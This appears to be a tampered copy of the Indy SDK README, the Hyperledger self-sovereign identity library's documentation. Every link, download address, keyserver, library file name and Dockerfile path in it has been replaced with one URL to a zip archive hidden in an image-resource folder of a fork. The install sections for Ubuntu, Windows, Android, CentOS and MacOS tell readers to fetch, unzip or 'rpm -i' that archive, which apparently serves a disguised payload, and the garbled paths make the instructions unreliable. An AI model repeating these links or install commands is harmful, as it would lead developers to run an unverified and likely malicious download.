# Indy SDK
![logo](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
This is the official SDK for [Hyperledger Indy](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip),
which provides a distributed-ledger-based foundation for [self-sovereign identity](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip). Indy provides a software ecosystem for private, secure, and powerful identity, and the Indy SDK enables clients for it.
The major artifact of the SDK is a C-callable
library; there are also convenience wrappers for various programming languages and Indy CLI tool.

All bugs, stories, and backlog for this project are managed through [Hyperledger's Jira](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
in project IS (note that regular Indy tickets are in the INDY project instead...). Also, make sure to join
us on [Hyperledger's https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) at #indy-sdk to discuss. You will need a Linux Foundation login to get access to these channels

## Understanding Hyperledger Indy

If you have just started learning about self-sovereign identity, here are some resources to increase your understanding:

* This extended tutorial introduces Indy, explains how the whole ecosystem works, and how the
functions in the SDK can be used to construct rich clients: [Indy-SDK Getting-Started Guide](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

    * **Please take note** that this tutorial doesn't cover how sides set up a connection and exchange messages.
    How this communication channel can be built you can find at [Aries](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) project which describes it in great details.

* Hyperledger Indy Working Group calls happen every Thursday at 8amPT, 9amMT, 11amET, 4pmBST. Add to your calendar and join from any device: https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip

* A recent webinar explaining self-sovereign identity using Hyperledger Indy and Sovrin: [SSI Meetup Webinar](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

* Visit the main resource for all things "Indy" to get acquainted with the code base, helpful resources, and up-to-date information: [Hyperledger Wiki-Indy](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).

* You may also want to look at the [older guide](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
that explored the ecosystem via command line. That material is being
rewritten but still contains some useful ideas.

## Items included in this SDK

### libindy

The major artifact of the SDK is a C-callable library that provides the basic building blocks for
the creation of applications on the top of [Hyperledger Indy](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).
It is available for most popular desktop, mobile and server platforms.

### Libindy wrappers

A set of libindy wrappers for developing Indy-based applications in your favorite programming language.
Indy SDK provides libindy wrappers for the following programming languages and platforms:

* [Java](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [Python](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [iOS](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [NodeJS](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [.Net](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [Rust](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)


### Indy CLI

[Indy CLI](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) is the official command line interface that helps Indy developers and administrators.


### Libnullpay

[Libnullpay](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) is a libindy plugin that can be used for development of applications that use the Payments API of Indy SDK.

### Libvcx
[Libvcx](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) is a c-callable library built on top of libindy that provides a high-level
credential exchange protocol. It simplifies creation of agent applications and provides
better agent-2-agent interoperability for [Hyperledger Indy](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
infrastructure.

This library is currently in an **experimental** state and is not part of official releases.

### Libvcx wrappers

A set of libvcx wrappers for developing vcx-based applications in your favorite programming language.

Indy SDK provides libvcx wrappers for the following programming languages and platforms:

* [Java](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [Python](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [iOS](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [NodeJS](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

These wrappers are currently in **experimental** state and it is not part of official releases.

##### Example use
- For the main workflow example check [VCX Python demo](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).
- Another libvcx example is available as [VCX NodeJS demo](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).
- For mobile see [iOS Demo project](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) 

### LibVCX Agency
LibVCX can be used with 
[mediator agency](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
which enables asynchronous communication between 2 parties. 
- [Dummy Cloud Agent](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) is simple implementation of VCX compatible Cloud Agent.
The main purpose of this implementation is VCX testing, demos and documentation of VCX protocol.
- [NodeVCXAgency](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) is alternative implementation in NodeJS.

## How-To Tutorials
Short, simple tutorials that demonstrate how to accomplish common tasks
are also available. See the [docs/how-tos](docs/how-tos) folder.

1. [Write a DID and Query Its Verkey](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
2. [Rotate a Key](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
3. [Save a Schema and Cred Def](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
4. [Issue a Credential](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
5. [Negotiate a Proof](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
6. [Send a Secure Message](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

## Installing the SDK
### Release channels
The Indy SDK release process defines the following release channels:

* `master` - development builds for each push to master branch.
* `rc` - release candidates.
* `stable` - stable releases.

Please refer to our [release workflow](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) for more details.

### Ubuntu based distributions (Ubuntu 16.04 and 18.04)
It is recommended to install the SDK packages with APT:

    sudo apt-key adv --keyserver https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip --recv-keys CE7709D068DB5E88
    sudo add-apt-repository "deb https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip (xenial|bionic) {release channel}"
    sudo apt-get update
    sudo apt-get install -y {library}

* {library} must be replaced with libindy, libnullpay, libvcx or indy-cli.
* (xenial|bionic) xenial for 16.04 Ubuntu and bionic for 18.04 Ubuntu.
* {release channel} must be replaced with master, rc or stable to define corresponded release channel.
Please See the section "Release channels" above for more details.

### Windows

1. Go to `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip{library}/{release-channel}.`
2. Download last version of library.
3. Unzip archives to the directory where you want to save working library.
4. After unzip you will get next structure of files:

* `Your working directory for libindy`
    * `include`
        * `...`
    * `lib`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`

`include` contains c-header files which contains all necessary declarations
that may be need for your applications.

`lib` contains all necessary binaries which contains libindy and all it's dependencies.
 `You must add to PATH environment variable path to lib`. It's necessary for dynamic linkage
 your application with libindy.

{release channel} must be replaced with master, rc or stable to define corresponded release channel.
See section "Release channels" for more details.

{library} must be replaced with libindy, libnullpay, libvcx or indy-cli.

### iOS

See [wrapper iOS install documentation](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip "How to install").

### Android

1. Go to `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip{library}/{release-channel}`.
2. 3 architecture are supported as of now arm,arm64 and x86.
3. Download latest version of library.
4. Unzip archives to the directory where you want to save the `.so` files.
5. After unzip you will get next structure of files:

* `Your working directory for libindy`
    * `include`
        * `...`
    * `lib`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
        * `libindy.a`

`include` contains c-header files which contains all necessary declarations
that may be need for your applications.

`lib` contains three types of binaries.
 * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip` - This is a shared library which is statically linked with all the depenedencies.
 You dont need to sidelaod other dependencies like zmq, sodium and openssl to android app if you use this.

 * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip` - This is pure shared library. It is not dynamically linked to its dependencies.
 You need to sideload the binaries with its dependencies. You can download the needed pre-built dependencies from [here](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
    * Rename this library to `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip` before loading it into the app. This will help you in having the compatibility with existing wrappers.

 * `libindy.a` - This is a static library, which is compiled with NDK.

{library} must be replaced with libindy, libnullpay or libvcx.

 [How to use instructions.](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)  

{release channel} must be replaced with rc or stable to define corresponded release channel.
See section "Release channels" for more details.

 **Note** :

 - [WARNING] This library should be considered as experimental as currently unit tests are *not* executed in the CI phase.


### Centos

1. Go to `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip{library}/{release-channel}`.
2. Download and unzip the last version of library.
3. Install with `rpm -i https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`.

{library} must be replaced with libindy, libnullpay, libvcx, indy-cli to define corresponded library.

{release channel} must be replaced with master, rc or stable to define corresponded release channel.
See section "Release channels" for more details.

### MacOS

1. Go to `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip{library}/{release-channel}`.
2. Download the latest version of library.
3. Unzip archives to the directory where you want to save working library.
4. After unzip you will get next structure of files:

* `Your working directory`
    * `include` - contains c-header files which contains all necessary declarations that may be need for your applications.
        * `...`
    * `lib` - contains library binaries (static and dynamic).
        * `library.a`
        * `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip`
    
5. Install dependent libraries: libsodium, zeromq, openssl. The dependent libraries should match the version with what you can find from ``otool -L https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip``.

You need add the path to lib folder to LIBRARY_PATH environment variable. 
    
{library} must be replaced with libindy, libnullpay, libvcx or indy-cli to define corresponded library.

{release channel} must be replaced with master, rc or stable to define corresponded release channel.
    
## How to build Indy SDK from source

* [Ubuntu based distributions (Ubuntu 16.04)](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [RHEL based distributions (Centos)](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [Windows](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [MacOS](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [Android](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

**Note:**
By default `cargo build` produce debug artifacts with a large amount of run-time checks.
It's good for development, but this build can be in 100+ times slower for some math calculation.
If you would like to analyse CPU performance of libindy for your use case, you have to use release artifacts (`cargo build --release`).

## How to start local nodes pool with docker
To test the SDK codebase with a virtual Indy node network, you can start a pool of local nodes using docker:

**Note: If you are getting a PoolLedgerTimeout error it's because the IP addresses in
cli/docker_pool_transactions_genesis and the pool configuration don't match.
Use method 3 to configure the IPs of the docker containers to match the pool.**

### 1) Starting the test pool on localhost
Start the pool of local nodes on `127.0.0.1:9701-9708` with Docker by running:

```
docker build -f https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip -t indy_pool .
docker run -itd -p 9701-9708:9701-9708 indy_pool
```

### 2) Starting the test pool on a specific IP address
 Dockerfile `https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip` supports an optional pool_ip param that allows
 changing ip of pool nodes in generated pool configuration.

 You can start the pool with e.g. with the IP address of your development machine's WIFI interface
 so that mobile apps in the same network can reach the pool.

 ```
 # replace 192.168.179.90 with your wifi IP address
 docker build --build-arg pool_ip=192.168.179.90 -f https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip -t indy_pool .
 docker run -itd -p 192.168.179.90:9701-9708:9701-9708 indy_pool
 ```
 To connect to the pool the IP addresses in /var/lib/indy/sandbox/pool_transactions_genesis (in docker) and
 the pool configuration you use in your mobile app must match.

### 3) Starting the test pool on a docker network
 The following commands allow to start local nodes pool in custom docker network and access this pool
 by custom ip in docker network:

 ```
 docker network create --subnet 10.0.0.0/8 indy_pool_network
 docker build --build-arg pool_ip=10.0.0.2 -f https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip -t indy_pool .
 docker run -d --ip="10.0.0.2" --net=indy_pool_network indy_pool
 ```
 Note that for Windows and MacOS this approach has some issues. Docker for these OS run in
 their virtual environment. First command creates network for container and host can't
 get access to that network because container placed on virtual machine. You must appropriate set up
 networking on your virtual environment. See the instructions for MacOS below.

### Docker port mapping on MacOS

If you use some Docker distribution based on Virtual Box you can use Virtual Box's
port forwarding future to map 9701-9709 container ports to local 9701-9709 ports.

If you use VMWare Fusion to run Docker locally, follow the instructions from
[this article](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
and add the following lines to _/Library/Preferences/VMware https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip

```
# Use these with care - anyone can enter into your VM through these...
# The format and example are as follows:
#<external port number> = <VM's IP address>:<VM's port number>
#8080 = 172.16.3.128:80
9701 = <your_docker_ip>:9701
9702 = <your_docker_ip>:9702
9703 = <your_docker_ip>:9703
9704 = <your_docker_ip>:9704
9705 = <your_docker_ip>:9705
9706 = <your_docker_ip>:9706
9707 = <your_docker_ip>:9707
9708 = <your_docker_ip>:9708
9709 = <your_docker_ip>:9709
```
where <your_docker_ip> is your Docker host IP.

Docker machine needs to be rebooted after these changes.

## Wrappers documentation

The following [wrappers](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) are tested and complete. 

There is also active work on a wrapper for Go; visit
[#indy-sdk on https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) for
details.

## Indy CLI documentation
* An explanation of how to install the official command line interface for that provides commands to manage wallets and interactions with the ledger: [Indy CLI](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

## How to migrate
The documents that provide necessary information for Libindy migrations.
 
* [v1.3.0 → v1.4.0](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.4.0 → v1.5.0](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.5.0 → v1.6.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.6.0 → v1.7.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.7.0 → v1.8.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.8.0 → v1.9.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.9.0 → v1.10.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.10.0 → v1.11.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.11.0 → v1.12.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.12.0 → v1.13.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.13.0 → v1.14.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)
* [v1.14.0 → v1.15.x](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip)

## How to Contribute
* We'd love your help; see these [HL Indy Wiki](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip+to+Contribute) and [slides on how to contribute](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).
* If you need to add a new call, read this [instruction](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip).
* You may also want to read this info about [maintainers](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) and our process.
* We use developer certificate of origin (DCO) in all hyperledger repositories,
  so to get your pull requests accepted, you must certify your commits by signing off on each commit.
  More information can be found in [Signing Commits](https://raw.githubusercontent.com/Ringopii/indy-sdk/master/vcx/wrappers/java/demo-android/AliceDemo/app/src/main/res/mipmap-xxhdpi/indy_sdk_v2.0.zip) article.


#### Notes
* Libindy implements multithreading approach based on **mpsc channels**.
If your application needs to use Libindy from multiple processes you should keep in mind the following restrictions:
    * Fork - duplicates only the main thread. So, child threads will not be duplicated.
      If any out-of-process requirements are possible, the caller must fork first **before any calls to Libindy**
      (otherwise the command from a child thread will hang). Fork is only available on Unix.
    * Popen - spawns a new OS level process which will create its own child threads. Popen is cross-platform.
